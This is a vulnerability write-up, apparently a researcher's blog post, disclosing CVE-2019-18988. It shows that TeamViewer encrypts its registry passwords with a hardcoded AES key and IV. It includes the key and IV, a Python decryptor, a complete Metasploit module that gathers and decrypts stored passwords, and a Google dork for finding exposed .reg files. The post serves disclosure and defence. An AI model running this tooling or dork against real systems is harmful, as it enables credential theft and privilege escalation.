---
title: "WhyNotSecurity"
date: 2020-02-03T00:00:00-00:01
categories:
  - blog
tags:
  - blog
  - blurbdust
share: false
---
Oh man where to even begin with this one. This was a crazy ride and I learned a ton along the way. 

TL;DR: TeamViewer stored user passwords encrypted with AES-128-CBC with they key of `0602000000a400005253413100040000` and iv of `0100010067244F436E6762F25EA8D704` in the Windows registry. If the password is reused anywhere, privilege escalation is possible. If you do not have RDP rights to machine but TeamViewer is installed, you can use TeamViewer to remote in. TeamViewer also lets you copy data or schedule tasks to run through their Service, which runs as `NT AUTHORITY\SYSTEM`, so a low privilege user can immediately go to `SYSTEM` with a `.bat` file. This was assigned CVE-2019-18988. 

I was on-site at a client and these guys were good. They fixed absolutely everything from the report last year. They were unaware of mimt6 and that's how we started getting some hashes rolling in. After finally cracking one we quickly found out this place was very locked down. Even the network admin did not have local admin on any windows machines nor did they have RDP rights anywhere either. We were able to find a few open shares and connect to them. We came across a backup of TeamViewer registry keys. I noted in the backup there were things like `OptionsPasswordAES` or `SecurityPasswordAES`. I quickly looked up to see what I could do with this and I found out it's not much. I could however import the registry settings or deploy them in a .msi so all the TeamViewer installs in the organization can have the same password. This lead me to believe there was a shared key across all TeamViewer which would backup the claim by the reg keys there is AES involved. In the end we were unable to compromise the client in time but the TeamViewer registry keys really stuck with me and thus begins this rabbit hole. 

The first thing I did was try to find the installer for the exact same version from the TeamViewer registry keys which happened to be version 7. A quick google search shows TeamViewer kindly offers all old version for download still which can be found [here](https://www.teamviewer.com/en/download/old-versions.aspx#version7). I setup a new Windows 10 VM and installed TeamViewer 7 on it. I played around with the settings and menus for a while. I imported the registry keys and was promptly locked out of the menu to change the options. It turns out the `OptionsPasswordAES` reg key is meant to keep unauthorized people out of the menu where you can change settings. I of course did not know the password and on a whim I downloaded [BulletPassView from nirsoft](https://www.nirsoft.net/utils/bullets_password_view.html) and ran that. Surprisingly, it gave me back a password in plaintext. Excellent, now I can get back into the Options page and look at the Security part of the menu. I was hoping the predefined Unattended Access Password would show up in BulletPassView as well. It only showed up as asterisks. On the plane ride home from the client, I watched [LiveOverflow's video on Windows Game Hacking](https://www.youtube.com/watch?v=Pst-4NwY2is) and how you can search through memory with Cheat Engine. So I download Cheat Engine to the VM and searched for the password I found earlier. There was one hit! I browsed that memory region and looked around. I discovered the Options Password is stored in cleartext in memory between the bytes `080088` and `000000000000`. I kept looking around and then I found between `090088` and `000000000000` and this gave me the two different passwords for which I was looking! I decided to see how many people have poked at TeamViewer in the past and it turns out the clear text credentials in memory has already been found and assigned [CVE-2018-14333](https://www.cvedetails.com/cve/CVE-2018-14333/). As it turns out there was a report on APT41 talking about how they attacked TeamViewer users or used TeamViewer to gain remote access to some users. The tweets were deleted but they can be seen [here](http://archive.ph/PDuu2) (Shout-out to the Internet Archive project and archive.is/archive.today).

After talking with some coworkers about looking for the key to decrypt future client passwords, [@knavesec](https://twitter.com/knavesec) asked if my VM was connected to the internet. I said yes and then realized I need to test if the VM is downloading the AES key or if it is stored in the binary itself. I spun up a new Windows 10 VM, set the network to Host-Only mode, and copied the installer for TeamViewer over a HTTP server running on my host machine. I was in fact still able to see the passwords in plaintext. Now I needed to fire up IDA Pro and start reversing the massive binary that is TeamViewer. I spent weeks on this part. It got to the point I could tell if IDA was going to crash based on if it detected x-refs to a certain string in the binary. I was dumping memory in random places and running through each chunk of 32-bytes of memory at a time to see if I could luck onto the key. I was not able to and I chalked it up to using Python for the AES decryption and I noted there was the string `Rijndael` in TeamViewer so maybe they were using actual rijndael and not AES. I found out TeamViewer used [Crypto++](https://en.wikipedia.org/wiki/Crypto%2B%2B) for it's encryption/decryption. As it turns out one of the supported modes in libcrypto++ was rijndael. I thought I was finally onto something. I used [API Monitor](http://www.rohitab.com/apimonitor) to step through TeamViewer and Cheat Engine to search for the passwords and once they popped up in memory, I dump the processes memory using [procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) and then ran through every single 32-byte chunk of memory as the key sliding by one byte at a time to ensure I hit every possible combination. Since I was now using C++ instead of python to do this, it went fairly quickly. However, it gave me nothing. (Spoiler alert: it may have but I was searching for the wrong thing.). I thought maybe procdump was compressing something so I learned how to dump memory using [Frida](https://www.frida.re/) and I ran through every possibility there as well, again with no luck. I decided to go back to reversing the binary. 

I spent so long digging through the binary I knew there had to be a better way. I kept researching and researching and it turns out there is a large amount of people that want to find the assets AES keys for Unity games. This lead me to a [blog post](https://blog.jamie.holdings/2019/03/23/reverse-engineering-aes-keys-from-unreal-engine-4-projects/) where I realized I was over thinking this and need to just use a debugger. After single stepping through TeamViewer for about 6 hours because I did not want to miss anything, I landed on the area of code that was responsible for the AES decryption. Here is a snippet from my notes. 

```
=================================================
"ServerPasswordAES"=hex:88,44,d7,0a,b2,96,2a,3d,63,16,3c,ff,e4,15,04,fb
=================================================
Takes 8844d70ab2962a3d63163cffe41504fb into xmm0
Takes 5B659253E5E873D26723B7D5EAC06E3B into xmm1
pxor xmm0, xmm1
movdqa xmmword ptr ds:[eax],xmm0
[eax] = D3214559577E59EF04358B2A0ED56AC0

movdqa xmm1,xmmword ptr ds:[esi]     | [esi] = 25C8C8BD4298BB32A57EECBDBD045BBB
movdqa xmm0,xmmword ptr ds:[eax]     | [eax] = D3214559577E59EF04358B2A0ED56AC0
aesdec xmm0,xmm1                     | One round of an AES decryption, using Equivalent Inverse Cipher, 128-bit data (state) from xmm1 with 128-bit round key from xmm2/m128; store the result in xmm1.
movdqa xmmword ptr ds:[eax],xmm0     | [eax] = 6F AA 98 76 DE 11 7D 8D 7E B6 EE 61 2D 3D 15 52
movdqa xmm1,xmmword ptr ds:[esi+10]  | [esi+10]=[008FDE10]=79 DC 78 A6 67 50 73 8F E7 E6 57 8F 18 7A B7 06
add esi,20                           |
dec ecx                              | ecx = 3
aesdec xmm0,xmm1                     | do the actual decryption
movdqa xmmword ptr ds:[eax],xmm0     | [eax]=[008FDC90]=E3 58 26 46 A7 37 12 40 85 1C C0 43 7D 1F 1E 30

Three more rounds of aesdec then
aesdeclast xmm0, xmm1 .| Last round of AES decryption, using Equivalent Inverse Cipher, 128-bit data (state) from xmm2 with a 128-bit round key from xmm3/m128; store the result in xmm1. 

008FDC90  01 00 01 00 67 24 4F 43 6E 67 62 F2 5E A8 D7 04  ....g$OCngbò^¨×.
```

This portion of code takes the bytes from the registry for `ServerPasswordAES` and then decrypts it with what appeared to be the key of `25C8C8BD4298BB32A57EECBDBD045BBB` this is actually incorrect. I asked a wizard [@ecdhe](https://github.com/ecdhe) what they knew about implementations of AES in assembly and they responded too quickly saying "the IV is supposed to be XOR'd with the first 128bits of the plaintext only after the `aesdec`". I realized I missed the `movdqa` into `xmm2` and the `pxor xmm0,xmm1` was not further obfuscation but rather the IV being used. I set a breakpoint to the beginning of the function and restarted the process. The mov into xmm2 was they key of `0602000000a400005253413100040000`. The IV is the decrypted bytes of `ServerPasswordAES` with the previously mentioned key and a null IV. In this case, the IV for `SecurityPasswordAES` was `0100010067244F436E6762F25EA8D704`. This works for TeamViewer Version 7 out of the box and on the latest version of Teamviewer 14 as long as the `SecurityPasswordExported` key is available. At the time of writing, I have not confirmed if it works on `PermanentPassword` which appears to be the Unattended Access Password for TeamViewer 14. 

In TeamViewer 14, they introduced a scripting engine for their business customers. Shown below is the output of `sc.exe qc TeamViewer7`.
```
PS C:\Users\Administrator\Documents\testing> sc.exe qc TeamViewer7
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: TeamViewer7
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files (x86)\TeamViewer\Version7\TeamViewer_Service.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : TeamViewer 7
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

Notice the last line in the output from `tasklist /v`. By having the password to a TeamViewer installation and the scripting engine enabled, you can escalate from a low privilege user to `NT AUTHORITY\SYSTEM` by only reading the registry. 

```
PS C:\Users\Administrator\Documents\testing> tasklist /v

Image Name                     PID Session Name        Session#    Mem Usage Status          User Name                                              CPU Time Window Title
========================= ======== ================ =========== ============ =============== ================================================== ============ ============================================
System Idle Process              0 Services                   0          4 K Unknown         NT AUTHORITY\SYSTEM                                    69:20:56 N/A
System                           4 Services                   0        144 K Unknown         N/A                                                     0:01:43 N/A
smss.exe                       260 Services                   0      1,264 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
csrss.exe                      376 Services                   0      4,300 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
wininit.exe                    444 Services                   0      5,172 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:02 N/A
csrss.exe                      452 Console                    1      4,332 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
winlogon.exe                   504 Console                    1      8,364 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
services.exe                   568 Services                   0      7,368 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
lsass.exe                      576 Services                   0     21,076 K Unknown         NT AUTHORITY\SYSTEM                                     0:05:14 N/A
svchost.exe                    660 Services                   0     20,084 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
svchost.exe                    712 Services                   0     11,604 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:21 N/A
LogonUI.exe                    812 Console                    1     42,972 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
dwm.exe                        820 Console                    1     30,396 K Unknown         Window Manager\DWM-1                                    0:00:00 N/A
svchost.exe                    912 Services                   0     78,452 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:07:20 N/A
svchost.exe                    948 Services                   0     27,564 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:18 N/A
svchost.exe                    956 Services                   0     19,964 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:03 N/A
svchost.exe                    396 Services                   0     17,756 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:01 N/A
svchost.exe                    440 Services                   0      9,608 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:35 N/A
svchost.exe                   1060 Services                   0     68,988 K Unknown         NT AUTHORITY\SYSTEM                                     0:04:04 N/A
svchost.exe                   1072 Services                   0     27,036 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:02 N/A
VSSVC.exe                     1188 Services                   0      7,772 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
svchost.exe                   1256 Services                   0     23,948 K Unknown         NT AUTHORITY\NETWORK SERVICE                            0:00:33 N/A
svchost.exe                   1268 Services                   0      7,040 K Unknown         NT AUTHORITY\LOCAL SERVICE                              0:00:00 N/A
spoolsv.exe                   1952 Services                   0     24,168 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
svchost.exe                   2032 Services                   0     31,012 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:04 N/A
IpOverUsbSvc.exe              1172 Services                   0     15,688 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:00 N/A
SolidCP.VmConfig.exe          1580 Services                   0     36,636 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:05 N/A
TeamViewer_Service.exe        1908 Services                   0     14,908 K Unknown         NT AUTHORITY\SYSTEM                                     0:00:01 N/A
```

Since you stuck around this long, here is a Google dork to find some TeamViewer registry keys. Yes, you can decrypt them. 
`"SecurityPasswordAES" OR "OptionsPasswordAES" OR "SecurityPasswordExported" OR "PermanentPassword" filetype:reg`


Timeline:
November 05th, 2019: Reach out to @TeamViewer_help on Twitter
November 05th, 2019: Send email to the Director of Security
November 14th, 2019: Request CVE based on precedent set by CVE-2014-1812
November 15th, 2019: Receive CVE-2019-18988
November 15th, 2019: Send email to Director of Security notifying them there is now a CVE assigned to this
November 18th, 2019: Receive first and only email back from vendor "We're looking into it" email
January  13th, 2020: Status update request email sent to Director of Security
February 03rd, 2020: Publish writeup


See below for an implementation in Python as well as further below for a post metasploit module
```python
import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify("0602000000a400005253413100040000")
iv = binascii.unhexlify("0100010067244F436E6762F25EA8D704")
hex_str_cipher = "d690a9d0a592327f99bb4c6a6b6d4cbe"			# output from the registry

ciphertext = binascii.unhexlify(hex_str_cipher)

raw_un = AESCipher(key).decrypt(iv, ciphertext)

print(hexdump.hexdump(raw_un))

password = raw_un.decode('utf-16')
print(password)
```

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
# @blurbdust based this code off of https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/credentials/gpp.rb
# and https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/enum_ms_product_keys.rb
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
        'Name'          => 'Windows Gather TeamViewer Passwords',
        'Description'   => %q{ This module will find and decrypt stored TeamViewer keys },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Nic Losby <blurbdust[at]gmail.com>'],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter' ]
      ))
  end

  def app_list
    results = ""
    keys = [
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version7", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version8", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version9", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version10", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version11", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version12", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version13", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version14", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer\\Version15", "Version" ],
      [ "HKLM\\SOFTWARE\\WOW6432Node\\TeamViewer", "Version" ],
      [ "HKLM\\SOFTWARE\\TeamViewer\\Temp", "SecurityPasswordExported" ],
      [ "HKLM\\SOFTWARE\\TeamViewer", "Version" ],
    ]

    keys.each do |keyx86|

      #parent key
      p = keyx86[0,1].join

      #child key
      c = keyx86[1,1].join

      key      = nil
      keychunk = registry_getvaldata(p, c)
      key      = keychunk.unpack("C*") if not keychunk.nil?

      optpass  = registry_getvaldata(p, "OptionsPasswordAES")
      secpass  = registry_getvaldata(p, "SecurityPasswordAES")
      secpasse = registry_getvaldata(p, "SecurityPasswordExported")
      servpass = registry_getvaldata(p, "ServerPasswordAES")
      proxpass = registry_getvaldata(p, "ProxyPasswordAES")
      license  = registry_getvaldata(p, "LicenseKeyAES")

      if not optpass.nil? 
        decvalue = decrypt(optpass)
        if not decvalue.nil?
          print_good("Found Options Password: #{decvalue}")
          results << "Options:#{decvalue}\n"
        end
      end
      if not secpass.nil? 
        decvalue = decrypt(secpass)
        if not decvalue.nil?
          print_good("Found Security Password: #{decvalue}")
          results << "Security:#{decvalue}\n"
        end
      end
      if not secpasse.nil? 
        decvalue = decrypt(secpasse)
        if not decvalue.nil?
          print_good("Found Security Password Exported: #{decvalue}")
          results << "SecurityE:#{decvalue}\n"
        end
      end
      if not servpass.nil? 
        decvalue = decrypt(servpass)
        if not decvalue.nil?
          print_good("Found Server Password: #{decvalue}")
          results << "Server:#{decvalue}\n"
        end
      end
      if not proxpass.nil? 
        decvalue = decrypt(proxpass)
        if not decvalue.nil?
          print_good("Found Proxy Password: #{decvalue}")
          results << "Proxy:#{decvalue}\n"
        end
      end
      if not license.nil? 
        decvalue = decrypt(license)
        if not decvalue.nil?
          print_good("Found License Key: #{decvalue}")
          results << "License:#{decvalue}\n"
        end
      end
    end

    #Only save data to disk when there's something in the table
    if not results.empty?
      path = store_loot("host.teamviewer_passwords", "text/plain", session, results, "teamviewer_passwords.txt", "TeamViewer Passwords")
      print_good("Passwords stored in: #{path.to_s}")
    end
  end

  def decrypt(encrypted_data)
    password = ""
    return password unless encrypted_data

    password = ""
    original_data = encrypted_data.dup

    decoded = encrypted_data
    #print_status(decoded)

    key = "\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
    iv  = "\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
    aes = OpenSSL::Cipher.new("AES-128-CBC")
    begin
      aes.decrypt
      aes.key = key
      aes.iv = iv
      plaintext = aes.update(decoded)
      password = Rex::Text.to_ascii(plaintext, 'utf-16le')
      if plaintext.empty?
        return nil
      end
    rescue OpenSSL::Cipher::CipherError => e
      puts "Unable to decode: \"#{encrypted_data}\" Exception: #{e}"
    end

    password
  end

  def run
    print_status("Finding TeamViewer Passwords on #{sysinfo['Computer']}")
    app_list
  end
end
```
